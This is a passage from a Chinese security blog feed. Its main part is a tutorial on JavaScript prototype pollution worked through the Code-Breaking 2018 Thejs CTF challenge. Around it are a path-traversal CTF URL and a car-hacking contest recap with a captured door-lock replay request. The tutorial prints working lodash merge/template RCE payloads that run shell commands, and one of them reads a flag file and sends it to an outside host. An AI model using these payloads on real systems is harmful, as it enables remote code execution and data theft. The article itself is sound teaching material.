&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt;e035ba36-&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;bf8-&lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;c8-&lt;span class=&quot;number&quot;&gt;9837&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;afecc32ca08.node3.hackingfor.fun&lt;span class=&quot;regexp&quot;&gt;/?url=/u&lt;/span&gt;nctf.com&lt;span class=&quot;regexp&quot;&gt;/../&lt;/span&gt;..&lt;span class=&quot;regexp&quot;&gt;/../&lt;/span&gt;..&lt;span class=&quot;regexp&quot;&gt;/flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 原型链污染</title>
    <link href="https://jlkl.github.io/2020/11/06/Web_16/"/>
    <id>https://jlkl.github.io/2020/11/06/Web_16/</id>
    <published>2020-11-05T16:30:16.000Z</published>
    <updated>2021-04-13T08:52:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、原型链基础知识"><a href="#一、原型链基础知识" class="headerlink" title="一、原型链基础知识"></a>一、原型链基础知识</h2><p>关于原型链基础可以查看：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">继承与原型链</a></p><blockquote><p>JavaScript 只有一种结构：对象。每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象（Object）的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p></blockquote><p>JavaScript 是动态的，本身不提供一个 <code>class</code> 实现（ES6 引入了 <code>class</code> 关键字，但只是语法糖，JavaScript 任然是基于原型的）</p><h3 id="prototype-和-proto"><a href="#prototype-和-proto" class="headerlink" title="prototype 和 __proto__"></a>prototype 和 <code>__proto__</code></h3><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo()</span><br></pre></td></tr></table></figure><p>Foo 函数的内容，就是 Foo 类的构造函数，而 this.bar 就是Foo类的一个属性。</p><a id="more"></a><p>每个类有一个 <code>prototype</code> 属性，它指向该类的原型对象。</p><p><img src="/2020/11/06/Web_16/20201105120709.png" alt="image-20201105120701124"></p><p>同样的每个实例也有一个 <code>__proto__</code> 属性指向实例对象的原型对象。</p><p><img src="/2020/11/06/Web_16/20201105120905.png" alt="image-20201105120905033"></p><p>实例对象 <code>__proto__</code> 与该实例对象所属类的 <code>prototype</code> 是相等的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(foo.__proto__ === Foo.prototype)<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>附上 Smi1e 师傅的图便于理解</p><p><img src="/2020/11/06/Web_16/20201105121216.png" alt="image-20201105121215145"></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个实例对象都有一个 <code>constructor</code> 属性指向对应的构造函数，即类。所以以下几种写法其实是相等的，都返回 <code>Foo</code> 类的原型对象。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Foo</span><span class="selector-class">.prototype</span></span><br><span class="line"><span class="selector-tag">foo</span><span class="selector-attr">[<span class="string">"__proto__"</span>]</span></span><br><span class="line"><span class="selector-tag">foo</span><span class="selector-class">.__proto__</span></span><br><span class="line"><span class="selector-tag">foo</span><span class="selector-class">.constructor</span><span class="selector-class">.prototype</span></span><br></pre></td></tr></table></figure><h3 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h3><blockquote><p>所有类对象在实例化的时候将会拥有 <code>prototype</code> 中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p></blockquote><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p></blockquote><p>JavaScript 的查找机制如下：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code> 的 <code>__proto__</code>就是 <code>null</code> </li></ol><p><img src="/2020/11/06/Web_16/20201105135325.png" alt="image-20201105135324336"></p><p><strong>不同对象所生成的原型链如下(部分)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">"yo"</span>, <span class="string">"whadup"</span>, <span class="string">"?"</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure><h2 id="二、原型链污染原理"><a href="#二、原型链污染原理" class="headerlink" title="二、原型链污染原理"></a>二、原型链污染原理</h2><blockquote><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value</p></blockquote><p><img src="/2020/11/06/Web_16/20201105140129.png" alt="image-20201105140128097"></p><blockquote><p>原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象</p></blockquote><h4 id="merge-操作导致原型链污染"><a href="#merge-操作导致原型链污染" class="headerlink" title="merge 操作导致原型链污染"></a>merge 操作导致原型链污染</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="comment">//1 2</span></span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>注意，这里如果不使用 json parse 的话，<code>__proto__</code> 会被认为是原型对象，不是 key，就不会覆盖。</p><h4 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h4><p>源码下载：<a href="http://code-breaking.com/puzzle/9/" target="_blank" rel="noopener">http://code-breaking.com/puzzle/9/</a></p><p>下载之后 <code>npm install</code> 即可自动安装依赖</p><p><strong>server.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port 3000!`</span>))</span><br></pre></td></tr></table></figure><p><code>lodash.template</code> 渲染模版，<code>lodash.merge</code> 合并函数或对象。整个程序逻辑，获取 post 数据，然后通过 <code>merge</code> 函数合并到 session 当中并显示。</p><p>通过 <code>merge</code> 函数可以将属性值注入到最底层的 <code>Object</code>，造成原型链污染，接下来找利用的点。</p><p><code>lodash/template.js</code> 中（实际调试是在 <code>lodash.js</code> 第 <code>14748</code> 行 ）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>options.sourceURL</code> 原本是没有赋值的，通过 <code>merge</code> 污染原型链注入 <code>sourceURL</code> 属性，然后在 <code>Function</code> 里拼接后执行。</p><p>关于 <code>Function</code> 构造函数可以参照这个链接，这里第一个参数为参数值，第二个参数我是把它理解为执行的函数的代码片段，所以可以通过加入 <code>\r\n</code> 字符注入恶意代码运行。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>这里直接给出 p神的可回显payload，需要注意坑点，原始 POST 提交，<code>Content-Type</code> 值为 <code>application/x-www-form-urlencoded</code>，需要修改为 <code>application/json</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.17.123.212:3000</span><br><span class="line"><span class="attribute">Content-Length</span>: 187</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://10.17.123.212:3000</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://10.17.123.212:3000/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"__proto__":&#123;"sourceURL":"\r\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('whoami')&#125;\r\n//"&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>其他无回显 payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"sourceURL"</span>:<span class="string">"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"sourceURL"</span>:<span class="string">"xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://l0ca1.com/$&#123;result&#125;`);req.end();\r\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这还有个 tip，因为范围原因，无法在 <code>Function</code> 函数里直接引用 <code>require</code>，<code>process</code> 等模块，需要在前面添加 <code>global</code>，可以查看 l0ca1 师傅的 writeup</p><p><a href="https://blog.l0ca1.xyz/2018/11/25/Code-Breaking-JS/" target="_blank" rel="noopener">https://blog.l0ca1.xyz/2018/11/25/Code-Breaking-JS/</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">require</span> = global.require || global.process.mainModule.constructor._load</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">继承与原型链</a></li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击 - Phithon</a></li><li><a href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">JavaScript 原型链污染 - Smi1e</a></li><li><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">Node.js 常见漏洞学习与总结</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、原型链基础知识&quot;&gt;&lt;a href=&quot;#一、原型链基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、原型链基础知识&quot;&gt;&lt;/a&gt;一、原型链基础知识&lt;/h2&gt;&lt;p&gt;关于原型链基础可以查看：&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;继承与原型链&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JavaScript 只有一种结构：对象。每个实例对象（ object ）都有一个私有属性（称之为 &lt;strong&gt;proto&lt;/strong&gt; ）指向它的构造函数的原型对象（&lt;strong&gt;prototype&lt;/strong&gt; ）。该原型对象也有一个自己的原型对象( &lt;strong&gt;proto&lt;/strong&gt; ) ，层层向上直到一个对象（Object）的原型对象为 &lt;code&gt;null&lt;/code&gt;。根据定义，&lt;code&gt;null&lt;/code&gt; 没有原型，并作为这个&lt;strong&gt;原型链&lt;/strong&gt;中的最后一个环节。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JavaScript 是动态的，本身不提供一个 &lt;code&gt;class&lt;/code&gt; 实现（ES6 引入了 &lt;code&gt;class&lt;/code&gt; 关键字，但只是语法糖，JavaScript 任然是基于原型的）&lt;/p&gt;
&lt;h3 id=&quot;prototype-和-proto&quot;&gt;&lt;a href=&quot;#prototype-和-proto&quot; class=&quot;headerlink&quot; title=&quot;prototype 和 __proto__&quot;&gt;&lt;/a&gt;prototype 和 &lt;code&gt;__proto__&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Foo&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.bar = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; foo = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Foo()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Foo 函数的内容，就是 Foo 类的构造函数，而 this.bar 就是Foo类的一个属性。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Node.js" scheme="https://jlkl.github.io/tags/Node-js/"/>
    
      <category term="JavaScript" scheme="https://jlkl.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>某车联网安全挑战赛总结</title>
    <link href="https://jlkl.github.io/2020/10/22/Other-02/"/>
    <id>https://jlkl.github.io/2020/10/22/Other-02/</id>
    <published>2020-10-22T06:19:50.000Z</published>
    <updated>2020-10-22T06:21:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、第一天"><a href="#一、第一天" class="headerlink" title="一、第一天"></a>一、第一天</h2><p><strong>上午</strong></p><p>CTF 夺旗，考验基础渗透能力，有些简单的题目 sqlmap 可以直接出，主要是 Web 和 Misc 方向的题目，一个半小时20多道题目，时间有点紧。没有提供网线，WiFi 连接内网，切换热点查资料不是很方便。</p><a id="more"></a><p><strong>下午</strong></p><p>汽车交互系统 App 漏洞挖掘，还有一个云平台，主要考验安卓逆向能力，不是想象中的给一个 apk 然后自己找漏洞，会提供一些填空题，问答题要求让你做。大概题目有，Apk包名是什么，使用的中间件名字版本，最主要的还是车身控制比如开关车门、空调预约指令的重放，大概看了一下数据先使用 AES 再使用 Base64 加密。</p><p><strong>关门指令数据包</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /eop/IAPPService/saveLockState?mobileNum=ixrlg%<span class="number">2</span>B4yOqNGFhorPPUJRQ%<span class="number">3</span>D%<span class="number">3</span>D&amp;token=<span class="number">0</span>%<span class="number">2</span>Fah6b%<span class="number">2</span>BJbUT5D5fDHcltV29caZViC05pvC3tKf605tc%<span class="number">3</span>D&amp;door=<span class="number">3</span>I4228ovBIPLv2Q6yyyE9Q%<span class="number">3</span>D%<span class="number">3</span>D&amp;state=KNYz3Sd6UE9gJ%<span class="number">2</span>BXCNCTVAQ%<span class="number">3</span>D%<span class="number">3</span>D&amp;deviceId=<span class="number">21e0</span>b51be0a0d2a75E%<span class="number">3</span>A2A%<span class="number">3</span>A86%<span class="number">3</span>A23%<span class="number">3</span>A80%<span class="number">3</span>A0C HTTP/<span class="number">1.1</span></span><br><span class="line">Charset: UTF<span class="number">-8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">timestamp: <span class="number">1603179934743</span></span><br><span class="line">sign: B4E15BFC376DB0640D8159CCF223FD71</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.101</span><span class="number">.34</span>:<span class="number">8080</span></span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=<span class="number">37716403183</span>F1A23B36555FEDF7C0AA2</span><br><span class="line">User-Agent: okhttp/<span class="number">3.12</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h2 id="二、第二天"><a href="#二、第二天" class="headerlink" title="二、第二天"></a>二、第二天</h2><p><strong>上午</strong></p><p>每个队伍一个小时进车，连接OBD获取车CAN指令信息，抓取每个控制CAN控制指令比如开关车窗发送的数据。这一块其实感觉和车联网关系不大，是车辆的控制和协议了，类似 Burp 抓包的过程，总共 75 项数据，执行每个指令后有些数据会变化，还有一些事周期性变化的数据，需要从这里面找出对应指令的数据。这块建议多摸真车实践操作。</p><p><strong>下午</strong></p><p>车辆娱乐系统漏洞挖掘，这块就比较开放，随意查找漏洞，安卓9.0系统。之前用中间人攻击抓取了部分流量分析，发现外网的请求就只有酷我音乐还有高德地图。这里我们有两个攻击的思路：</p><ol><li>拨号开启 adb 调试模式，然后安卓恶意 apk 